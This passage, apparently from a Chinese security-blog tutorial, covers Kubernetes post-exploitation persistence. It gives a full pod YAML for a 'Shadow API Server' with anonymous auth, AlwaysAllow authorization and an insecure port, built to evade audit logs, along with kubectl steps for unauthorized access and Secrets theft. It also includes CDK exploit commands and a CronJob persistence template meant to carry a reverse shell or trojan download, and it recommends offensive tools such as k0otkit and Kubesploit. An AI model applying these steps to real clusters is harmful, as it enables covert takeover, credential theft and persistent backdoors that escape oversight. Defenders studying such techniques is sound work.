+Shadow API Server攻击技术的思路是创建一个具有API Server功能的Pod，后续命令通过新的"Shadow API Server"下发，新的API Server创建时可以开放更大权限，并放弃采集审计日志，且不影响原有API-Server功能，日志不会被原有API-Server记录，从而达到隐蔽性和持久控制目的</p>
+<h4 data-content="1" id="c8583eca058fdfcbb766fe451172abda">手动实现</h4>
+<p>Step 1：首先查看kube-system命名空间下的kube-apiserver信息</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">kubectl get pods -n kube-system | grep kube-apiserver</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027143604-1a52e7f4-7493-1.png"/><br/>
+Step 2：查看kube-apiserver-master对应的YAML文件</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">kubectl get pods -n kube-system kube-apiserver-master -o yaml</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027143625-2683002c-7493-1.png"/><br/>
+Step 3：复制上述YAML内容并进行如下修改</p>
+<div class="highlight"><pre><span></span><span class="c1">#更新配置</span>
+<span class="l l-Scalar l-Scalar-Plain">--allow-privileged=true</span>
+<span class="l l-Scalar l-Scalar-Plain">--insecure-port=6445</span>
+<span class="l l-Scalar l-Scalar-Plain">--insecure-bind-address=0.0.0.0</span>
+<span class="l l-Scalar l-Scalar-Plain">--secure-port=6445</span>
+<span class="l l-Scalar l-Scalar-Plain">--anonymous-auth=true</span>
+<span class="l l-Scalar l-Scalar-Plain">--authorization-mode=AlwaysAllow</span>
+
+<span class="l l-Scalar l-Scalar-Plain">#删除子项</span>
+<span class="l l-Scalar l-Scalar-Plain">status</span>
+<span class="l l-Scalar l-Scalar-Plain">metadata.selfLink</span>
+<span class="l l-Scalar l-Scalar-Plain">metadata.uid</span>
+<span class="l l-Scalar l-Scalar-Plain">metadata.annotations</span>
+<span class="l l-Scalar l-Scalar-Plain">metadata.resourceVersion</span>
+<span class="l l-Scalar l-Scalar-Plain">metadata.creationTimestamp</span>
+<span class="l l-Scalar l-Scalar-Plain">spec.tolerations</span>
+</pre></div>
+<p>最终配置文件如下：</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">apiVersion</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">v1</span>
+<span class="l l-Scalar l-Scalar-Plain">kind</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">Pod</span>
+<span class="l l-Scalar l-Scalar-Plain">metadata</span><span class="p p-Indicator">:</span>
+  <span class="l l-Scalar l-Scalar-Plain">labels</span><span class="p p-Indicator">:</span>
+    <span class="l l-Scalar l-Scalar-Plain">component</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">kube-apiserver-shadow</span>
+    <span class="l l-Scalar l-Scalar-Plain">tier</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">control-plane</span>
+  <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">kube-apiserver-shadow</span>
+  <span class="l l-Scalar l-Scalar-Plain">namespace</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">kube-system</span>
+  <span class="l l-Scalar l-Scalar-Plain">ownerReferences</span><span class="p p-Indicator">:</span>
+  <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">apiVersion</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">v1</span>
+    <span class="l l-Scalar l-Scalar-Plain">controller</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">true</span>
+    <span class="l l-Scalar l-Scalar-Plain">kind</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">Node</span>
+    <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">master</span>
+    <span class="l l-Scalar l-Scalar-Plain">uid</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">a8b24753-c6b2-477e-9884-03784cf52afb</span>
+<span class="l l-Scalar l-Scalar-Plain">spec</span><span class="p p-Indicator">:</span>
+  <span class="l l-Scalar l-Scalar-Plain">containers</span><span class="p p-Indicator">:</span>
+  <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">command</span><span class="p p-Indicator">:</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">kube-apiserver</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--advertise-address=192.168.17.144</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--allow-privileged=true</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--anonymous-auth=true</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--authorization-mode=AlwaysAllow</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--client-ca-file=/etc/kubernetes/pki/ca.crt</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--enable-admission-plugins=NodeRestriction</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--enable-bootstrap-token-auth=true</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--etcd-servers=https://127.0.0.1:2379</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--insecure-port=9443</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--insecure-bind-address=0.0.0.0</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--requestheader-allowed-names=front-proxy-client</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--requestheader-extra-headers-prefix=X-Remote-Extra-</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--requestheader-group-headers=X-Remote-Group</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--requestheader-username-headers=X-Remote-User</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--secure-port=9444</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--service-account-key-file=/etc/kubernetes/pki/sa.pub</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--service-cluster-ip-range=192.96.0.0/12</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--tls-cert-file=/etc/kubernetes/pki/apiserver.crt</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">--tls-private-key-file=/etc/kubernetes/pki/apiserver.key</span>
+    <span class="l l-Scalar l-Scalar-Plain">image</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">registry.aliyuncs.com/google_containers/kube-apiserver:v1.17.4</span>
+    <span class="l l-Scalar l-Scalar-Plain">imagePullPolicy</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">IfNotPresent</span>
+    <span class="l l-Scalar l-Scalar-Plain">livenessProbe</span><span class="p p-Indicator">:</span>
+      <span class="l l-Scalar l-Scalar-Plain">failureThreshold</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">8</span>
+      <span class="l l-Scalar l-Scalar-Plain">httpGet</span><span class="p p-Indicator">:</span>
+        <span class="l l-Scalar l-Scalar-Plain">host</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">192.168.17.144</span>
+        <span class="l l-Scalar l-Scalar-Plain">path</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">/healthz</span>
+        <span class="l l-Scalar l-Scalar-Plain">port</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">9443</span>
+        <span class="l l-Scalar l-Scalar-Plain">scheme</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">HTTPS</span>
+      <span class="l l-Scalar l-Scalar-Plain">initialDelaySeconds</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">15</span>
+      <span class="l l-Scalar l-Scalar-Plain">periodSeconds</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">10</span>
+      <span class="l l-Scalar l-Scalar-Plain">successThreshold</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">1</span>
+      <span class="l l-Scalar l-Scalar-Plain">timeoutSeconds</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">15</span>
+    <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">kube-apiserver</span>
+    <span class="l l-Scalar l-Scalar-Plain">resources</span><span class="p p-Indicator">:</span>
+      <span class="l l-Scalar l-Scalar-Plain">requests</span><span class="p p-Indicator">:</span>
+        <span class="l l-Scalar l-Scalar-Plain">cpu</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">250m</span>
+    <span class="l l-Scalar l-Scalar-Plain">terminationMessagePath</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">/dev/termination-log</span>
+    <span class="l l-Scalar l-Scalar-Plain">terminationMessagePolicy</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">File</span>
+    <span class="l l-Scalar l-Scalar-Plain">volumeMounts</span><span class="p p-Indicator">:</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">mountPath</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">/etc/ssl/certs</span>
+      <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">ca-certs</span>
+      <span class="l l-Scalar l-Scalar-Plain">readOnly</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">true</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">mountPath</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">/etc/pki</span>
+      <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">etc-pki</span>
+      <span class="l l-Scalar l-Scalar-Plain">readOnly</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">true</span>
+    <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">mountPath</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">/etc/kubernetes/pki</span>
+      <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">k8s-certs</span>
+      <span class="l l-Scalar l-Scalar-Plain">readOnly</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">true</span>
+  <span class="l l-Scalar l-Scalar-Plain">dnsPolicy</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">ClusterFirst</span>
+  <span class="l l-Scalar l-Scalar-Plain">enableServiceLinks</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">true</span>
+  <span class="l l-Scalar l-Scalar-Plain">hostNetwork</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">true</span>
+  <span class="l l-Scalar l-Scalar-Plain">nodeName</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">master</span>
+  <span class="l l-Scalar l-Scalar-Plain">priority</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">2000000000</span>
+  <span class="l l-Scalar l-Scalar-Plain">priorityClassName</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">system-cluster-critical</span>
+  <span class="l l-Scalar l-Scalar-Plain">restartPolicy</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">Always</span>
+  <span class="l l-Scalar l-Scalar-Plain">schedulerName</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">default-scheduler</span>
+  <span class="l l-Scalar l-Scalar-Plain">securityContext</span><span class="p p-Indicator">:</span> <span class="p p-Indicator">{}</span>
+  <span class="l l-Scalar l-Scalar-Plain">terminationGracePeriodSeconds</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">30</span>
+  <span class="l l-Scalar l-Scalar-Plain">volumes</span><span class="p p-Indicator">:</span>
+  <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">hostPath</span><span class="p p-Indicator">:</span>
+      <span class="l l-Scalar l-Scalar-Plain">path</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">/etc/ssl/certs</span>
+      <span class="l l-Scalar l-Scalar-Plain">type</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">DirectoryOrCreate</span>
+    <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">ca-certs</span>
+  <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">hostPath</span><span class="p p-Indicator">:</span>
+      <span class="l l-Scalar l-Scalar-Plain">path</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">/etc/pki</span>
+      <span class="l l-Scalar l-Scalar-Plain">type</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">DirectoryOrCreate</span>
+    <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">etc-pki</span>
+  <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">hostPath</span><span class="p p-Indicator">:</span>
+      <span class="l l-Scalar l-Scalar-Plain">path</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">/etc/kubernetes/pki</span>
+      <span class="l l-Scalar l-Scalar-Plain">type</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">DirectoryOrCreate</span>
+    <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">k8s-certs</span>
+</pre></div>
+<p>Step 4：创建一个附加由API Server功能的pod</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">kubectl create -f api.yaml</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027143803-615a65aa-7493-1.png"/><br/>
+Step 5：端口服务查看<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027143816-68f5296c-7493-1.png"/><br/>
+Step 6：在浏览器中实现未授权访问测试<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027143832-728c7c3c-7493-1.png"/><br/>
+Step 7：在命令行中实现未授权访问</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">kubectl -s http://192.168.17.144:9443 get nodes</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027143848-7bca1b1a-7493-1.png"/></p>
+<h4 data-content="1" id="08ca53a2c8b9ca006be090b9078c2558">工具实现</h4>
+<p>Step 1：在Pod中使用CDK寻找脆弱点</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">cdk evaluate</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027143918-8e200892-7493-1.png"/><br/>
+Step 2：发现当前Pod内置Service account具有高权限，接下来使用EXP部署Shadow API Server</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">cdk run k8s-shadow-apiserver default</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027143937-9939be26-7493-1.png"/><br/>
+Step 3：部署成功之后，后续渗透操作全部由新的Shadow API Server代理，由于打开了无鉴权端口，任何pod均可直接向Shadow API Server发起请求管理集群<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027143949-a01a2802-7493-1.png"/><br/>
+Step 4：获取K8s的Secrets凭据信息</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027144000-a725e4ce-7493-1.png"/></p>
+<h3 data-content="1" id="2b03f3eacd4bb915f86dffe7764f3eb4">K8s CronJob</h3>
+<h4 data-content="1" id="5b5401af49ed39ad6da30dcb027dffc0">基本概述</h4>
+<p>CronJob用于执行周期性的动作，例如:备份、报告生成等，攻击者可以利用此功能持久化</p>
+<h4 data-content="1" id="6f08a1890b3927dc59aa7b81d8c3e87c">具体实现</h4>
+<p>Step 1：创建cron.yaml文件</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">apiVersion</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">batch/v1beta1</span>
+<span class="l l-Scalar l-Scalar-Plain">kind</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">CronJob</span>                    <span class="c1">#使用CronJob对象</span>
+<span class="l l-Scalar l-Scalar-Plain">metadata</span><span class="p p-Indicator">:</span>
+  <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">hello</span>
+<span class="l l-Scalar l-Scalar-Plain">spec</span><span class="p p-Indicator">:</span>
+  <span class="l l-Scalar l-Scalar-Plain">schedule</span><span class="p p-Indicator">:</span> <span class="s">"*/1</span><span class="nv"> </span><span class="s">*</span><span class="nv"> </span><span class="s">*</span><span class="nv"> </span><span class="s">*</span><span class="nv"> </span><span class="s">*"</span>        <span class="c1">#每分钟执行一次</span>
+  <span class="l l-Scalar l-Scalar-Plain">jobTemplate</span><span class="p p-Indicator">:</span>
+    <span class="l l-Scalar l-Scalar-Plain">spec</span><span class="p p-Indicator">:</span>
+      <span class="l l-Scalar l-Scalar-Plain">template</span><span class="p p-Indicator">:</span>
+        <span class="l l-Scalar l-Scalar-Plain">spec</span><span class="p p-Indicator">:</span>
+          <span class="l l-Scalar l-Scalar-Plain">containers</span><span class="p p-Indicator">:</span>
+          <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">hello</span>
+            <span class="l l-Scalar l-Scalar-Plain">image</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">alpine</span>
+            <span class="l l-Scalar l-Scalar-Plain">imagePullPolicy</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">IfNotPresent</span>
+            <span class="l l-Scalar l-Scalar-Plain">command</span><span class="p p-Indicator">:</span>
+            <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">/bin/bash</span>
+            <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">-c</span>
+            <span class="p p-Indicator">-</span> <span class="c1">#反弹Shell或者下载并执行木马</span>
+          <span class="l l-Scalar l-Scalar-Plain">restartPolicy</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">OnFailure</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027144042-bfe3c7ce-7493-1.png"/><br/>
+Step 2：部署pod</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">kubectl create -f cron.yaml</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027144059-ca058eb8-7493-1.png"/><br/>
+Step 3：之后再监听端并未获取到shell<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027144240-068d51ea-7494-1.png"/><br/>
+随后发现未反弹回shell的原因是因为IP网段问题，相关测试如下<br/>
+Step 1：测试yaml文件</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">apiVersion</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">batch/v1beta1</span>
+<span class="l l-Scalar l-Scalar-Plain">kind</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">CronJob</span>
+<span class="l l-Scalar l-Scalar-Plain">metadata</span><span class="p p-Indicator">:</span>
+  <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">hello</span>
+<span class="l l-Scalar l-Scalar-Plain">spec</span><span class="p p-Indicator">:</span>
+  <span class="l l-Scalar l-Scalar-Plain">schedule</span><span class="p p-Indicator">:</span> <span class="s">"*/1</span><span class="nv"> </span><span class="s">*</span><span class="nv"> </span><span class="s">*</span><span class="nv"> </span><span class="s">*</span><span class="nv"> </span><span class="s">*"</span>
+  <span class="l l-Scalar l-Scalar-Plain">jobTemplate</span><span class="p p-Indicator">:</span>
+    <span class="l l-Scalar l-Scalar-Plain">spec</span><span class="p p-Indicator">:</span>
+      <span class="l l-Scalar l-Scalar-Plain">template</span><span class="p p-Indicator">:</span>
+        <span class="l l-Scalar l-Scalar-Plain">spec</span><span class="p p-Indicator">:</span>
+          <span class="l l-Scalar l-Scalar-Plain">containers</span><span class="p p-Indicator">:</span>
+          <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">hello</span>
+            <span class="l l-Scalar l-Scalar-Plain">image</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">busybox</span>
+            <span class="l l-Scalar l-Scalar-Plain">args</span><span class="p p-Indicator">:</span>
+            <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">/bin/sh</span>
+            <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">-c</span>
+            <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">ifconfig; echo Hello aliang</span>
+          <span class="l l-Scalar l-Scalar-Plain">restartPolicy</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">OnFailure</span>
+</pre></div>
+<p>Step 2：部署后查看logs<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027144405-394634ee-7494-1.png"/></p>
+<h4 data-content="1" id="1551d886f20c85f99eaf89a9dfd5657d">工具实现</h4>
+<p>使用方法：</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">cdk run k8s-cronjob (default|anonymous|&lt;service-account-token-path&gt;) (min|hour|day|&lt;cron-expr&gt;) &lt;image&gt; &lt;args&gt;</span>
+
+<span class="l l-Scalar l-Scalar-Plain">Request Options</span><span class="p p-Indicator">:</span>
+<span class="l l-Scalar l-Scalar-Plain">default</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">connect API server with pod's default service account token</span>
+<span class="l l-Scalar l-Scalar-Plain">anonymous</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">connect API server with user system:anonymous</span>
+<span class="l l-Scalar l-Scalar-Plain">&lt;service-account-token-path&gt;</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">connect API server with user-specified service account token.</span>
+
+<span class="l l-Scalar l-Scalar-Plain">Cron Options</span><span class="p p-Indicator">:</span>
+<span class="l l-Scalar l-Scalar-Plain">min</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">deploy cronjob with schedule "* * * * *"</span>
+<span class="l l-Scalar l-Scalar-Plain">hour</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">deploy cronjob with schedule "0 * * * *"</span>
+<span class="l l-Scalar l-Scalar-Plain">day</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">deploy cronjob with schedule "0 0 * * *"</span>
+<span class="l l-Scalar l-Scalar-Plain">&lt;cron-expr&gt;</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">your custom cron expression</span>
+
+<span class="l l-Scalar l-Scalar-Plain">Exploit Options</span><span class="p p-Indicator">:</span>
+<span class="l l-Scalar l-Scalar-Plain">&lt;image&gt;</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">your backdoor image (you can upload it to dockerhub before)</span>
+<span class="l l-Scalar l-Scalar-Plain">&lt;args&gt;</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">your custom shell command which will run when container creates</span>
+</pre></div>
+<p>使用实例：</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">./cdk run k8s-cronjob default min alpine "echo hellow;echo cronjob"</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027144443-4fe50482-7494-1.png"/><br/>
+执行之后：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027144454-55ecd1d4-7494-1.png"/></p>
+<h2 data-content="1" id="76e77e79ffab9306b64efe7a5fc36aa8">工具推荐</h2>
+<h3 data-content="1" id="0424fecdf54af1a30b078d52fc4d391e">Nebula</h3>
+<p>Nebula是一个云和DevOps渗透测试框架，它为每个提供者和每个功能构建了模块，截至 2021年4月，它仅涵盖AWS，但目前是一个正在进行的项目，有望继续发展以测试GCP、Azure、Kubernetes、Docker或Ansible、Terraform、Chef等自动化引擎<br/>
+<a href="https://github.com/gl4ssesbo1/Nebula" target="_blank">https://github.com/gl4ssesbo1/Nebula</a></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027145025-1b2eecd4-7495-1.png"/></p>
+<h3 data-content="1" id="d175b8766fdcd94c770b9f93b4c4c827">k0otkit</h3>
+<p>k0otkit是一种通用的后渗透技术，可用于对Kubernetes集群的渗透，攻击者可以使用k0otkit快速、隐蔽和连续的方式(反向shell)操作目标Kubernetes集群中的所有节点，K0otkit使用到的技术主要有以下几个：</p>
+<ul>
+<li>kube-proxy镜像(就地取材)</li>
+<li>动态容器注入(高隐蔽性)</li>
+<li>Meterpreter(流量加密)</li>
+<li>无文件攻击(高隐蔽性)</li>
+</ul>
+<p>DaemonSet和Secret资源(快速持续反弹、资源分离)<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027145158-52b182de-7495-1.png"/></p>
+<h3 data-content="1" id="f60d555774f6bf9363bd099a974d4e23">CDK Tools</h3>
+<p>CDK是一款为容器环境定制的渗透测试工具，在已攻陷的容器内部提供零依赖的常用命令及PoC/EXP，集成Docker/K8s场景特有的逃逸、横向移动、持久化利用方式，插件化管理<br/>
+<a href="https://github.com/cdk-team/CDK" target="_blank">https://github.com/cdk-team/CDK</a><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027144752-c01c8022-7494-1.png"/></p>
+<h3 data-content="1" id="6f67e132f1d88fe256e4896b8139ad90">Kubesploit:</h3>
+<p>Kubesploit是一个功能强大的跨平台后渗透漏洞利用HTTP/2命令&amp;控制服务器和代理工具，基于Merlin项目实现其功能，主要针对的是容器化环境的安全问题<br/>
+<a href="https://github.com/cyberark/kubesploit" target="_blank">https://github.com/cyberark/kubesploit</a><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231027144813-cd15504c-7494-1.png"/></p>
+<h2 data-content="1" id="811d70cf6f2ed412aed0ce81f53b905f">参考链接</h2>
+<p><a href="https://youtu.be/GupI5nUgQ9I" target="_blank">https://youtu.be/GupI5nUgQ9I</a><br/>
+<a href="https://capsule8.com/blog/practical-container-escape-exercise/" target="_blank">https://capsule8.com/blog/practical-container-escape-exercise/</a><br/>
+<a href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html" target="_blank">https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html</a><br/>
+<a href="https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation" target="_blank">https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation</a><br/>
